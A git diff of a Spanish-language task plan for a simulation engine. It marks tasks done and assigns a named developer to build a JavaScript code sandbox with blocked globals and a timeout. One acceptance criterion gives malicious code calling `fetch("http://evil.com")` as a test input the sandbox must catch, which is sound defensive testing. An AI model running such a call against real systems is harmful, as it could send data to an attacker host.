@@ -249,7 +249,7 @@ El **Structural Block** no tiene lógica de ejecución propia. Es un contenedor 
   - [ ] Estado: `estado`, `eventos[]`, `valoresRuntime`, `contadorPasos`.
   - [ ] Acciones que invocan al `MotorSimulacion`.
   - [ ] Suscripción a `useEditorStore` para sincronizar runtime con el canvas.
-- [ ] Documentar todo el código con comentarios en español.
+- [x] Documentar todo el código con comentarios en español.
 
 **Plazo:** Martes + Miércoles mañana.
 
@@ -298,7 +298,7 @@ El **Structural Block** no tiene lógica de ejecución propia. Es un contenedor 
 
 ---
 
-### Persona 3 — Lógica de Service, Functional Block, Sample, Hold y EjecutorCodigo
+### Julian Dario Romero Buitrago — Lógica de Service, Functional Block, Sample, Hold y EjecutorCodigo
 
 **Archivos a crear:**
 - `src/engine/elementos/ElementoService.ts`
@@ -307,37 +307,38 @@ El **Structural Block** no tiene lógica de ejecución propia. Es un contenedor 
 - `src/engine/elementos/ElementoRetencion.ts`
 - `src/engine/elementos/ElementoBloqueEstructural.ts`
 - `src/engine/EjecutorCodigo.ts`
+- `src/workers/javascript.worker.ts`
 - `src/workers/pyodide.worker.ts` (si da tiempo)
 
 **Tareas:**
-- [ ] Implementar `ElementoService.ts`: recibir y publicar valores sin transformar.
-- [ ] Implementar `ElementoBloqueFuncional.ts`:
-  - [ ] Recibir entradas, mapear nombres de puertos a variables, llamar al `EjecutorCodigo`.
-  - [ ] Manejar errores de ejecución y almacenarlos.
-  - [ ] Retrocompatibilidad: si no hay `code`, usar `expression` con `evaluateGuard`.
-- [ ] Crear `EjecutorCodigo.ts` (sandbox JS):
-  - [ ] `ejecutarJS(codigo, entradas)`: sandbox con `new Function()`, scope restringido.
-  - [ ] Auto-detección de expresión simple vs función completa.
-  - [ ] Bloqueo de `window`, `document`, `fetch`, etc.
-  - [ ] Timeout de 1 segundo.
-  - [ ] Captura de errores con mensaje claro.
-- [ ] Implementar `ElementoMuestreo.ts` (Sample): capturar valor de Data cuando Control es `true`.
-- [ ] Implementar `ElementoRetencion.ts` (Hold): retener último valor discreto recibido.
-- [ ] Implementar `ElementoBloqueEstructural.ts`: solo gestión de hijos.
+- [x] Implementar `ElementoService.ts`: recibir y publicar valores sin transformar.
+- [x] Implementar `ElementoBloqueFuncional.ts`:
+  - [x] Recibir entradas, mapear nombres de puertos a variables, llamar al `EjecutorCodigo`.
+  - [x] Manejar errores de ejecución y almacenarlos.
+  - [x] Retrocompatibilidad: si no hay `code`, usar `expression` con `evaluateGuard`.
+- [x] Crear `EjecutorCodigo.ts` (sandbox JS):
+- [x] `ejecutarJS(codigo, entradas)`: sandbox con `new Function()`, scope restringido.
+- [x] Auto-detección de expresión simple vs función completa.
+- [x] Bloqueo de `window`, `document`, `fetch`, etc.
+  - [x] Timeout real de 1 segundo mediante Web Worker y terminación del Worker.
+- [x] Captura de errores con mensaje claro.
+- [x] Implementar `ElementoMuestreo.ts` (Sample): capturar valor de Data cuando Control es `true`.
+- [x] Implementar `ElementoRetencion.ts` (Hold): retener último valor discreto recibido.
+- [x] Implementar `ElementoBloqueEstructural.ts`: solo gestión de hijos.
 - [ ] (Si da tiempo) Worker de Pyodide para código Python.
-- [ ] Documentar todo el código con comentarios en español.
+- [x] Documentar todo el código con comentarios en español.
 
 **Plazo:** Martes + Miércoles.
 
 **Criterios de aceptación:**
-- [ ] `ejecutarJS('return inputs.x < 76', { x: 70 })` retorna `true`.
-- [ ] `ejecutarJS('return inputs.x < 76', { x: 80 })` retorna `false`.
-- [ ] Bucle infinito `while(true){}` → timeout sin congelar la UI.
-- [ ] Código malicioso `fetch("http://evil.com")` → error capturado.
-- [ ] Expresión simple `humedad < 76` se auto-detecta y se envuelve en `return`.
-- [ ] Un FB sin código usa la retrocompatibilidad con `expression`.
-- [ ] Sample captura solo con señal de control activa.
-- [ ] Hold mantiene último valor entre eventos.
+- [x] `ejecutarJS('return inputs.x < 76', { x: 70 })` retorna `true`.
+- [x] `ejecutarJS('return inputs.x < 76', { x: 80 })` retorna `false`.
+- [x] Bucle infinito `while(true){}` → timeout sin congelar la UI.
+- [x] Código malicioso `fetch("http://evil.com")` → error capturado.
+- [x] Expresión simple `humedad < 76` se auto-detecta y se envuelve en `return`.
+- [x] Un FB sin código usa la retrocompatibilidad con `expression`.
+- [x] Sample captura solo con señal de control activa.
+- [x] Hold mantiene último valor entre eventos.
 
 ---
 
@@ -383,7 +384,7 @@ El **Structural Block** no tiene lógica de ejecución propia. Es un contenedor 
 
 **Plazo:** Miércoles + Jueves.
 
-> Persona 4 depende de que Persona 1 (store de simulación) y Persona 3 (ejecutor de código) estén al menos parcialmente funcionales para el miércoles.
+> Persona 4 depende de que Persona 1 (store de simulación) y Julian Dario Romero Buitrago (ejecutor de código) estén al menos parcialmente funcionales para el miércoles.
 
 **Criterios de aceptación:**
 - [ ] Se puede escribir código JS en un Functional Block con syntax highlighting.
@@ -445,7 +446,7 @@ Juan David Romero │ interfaces.ts       │ EvaluadorPetri    │ Ajustes     
                   │ ElementoLugar       │ index.ts          │ por feedback     │ BUFFER
                   │ ElementoTransicion  │                   │                  │
                   │                     │                   │                  │
-Persona 3 │ ElementoService     │ EjecutorCodigo    │ Pyodide Worker   │
+Julian Dario Romero Buitrago │ ElementoService     │ EjecutorCodigo    │ Pyodide Worker   │
           │ ElementoBloqueFun.  │ (sandbox completo)│ (si da tiempo)   │ BUFFER
           │ ElementoMuestreo    │                   │                  │
           │ ElementoRetencion   │                   │                  │
@@ -461,9 +462,9 @@ Persona 5 │ Config Vitest       │ Tests Petri       │ Integración      �
 
 **Dependencias entre personas:**
 
-- Persona 4 (UI) depende de Persona 1 (store) y Persona 3 (ejecutor) para miércoles.
+- Persona 4 (UI) depende de Persona 1 (store) y Julian Dario Romero Buitrago (ejecutor) para miércoles.
 - Persona 5 (integración) depende de todas las demás para jueves.
-- Persona 1, Juan David Romero y Persona 3 pueden trabajar en paralelo desde el martes.
+- Persona 1, Juan David Romero y Julian Dario Romero Buitrago pueden trabajar en paralelo desde el martes.
 
 ---
 
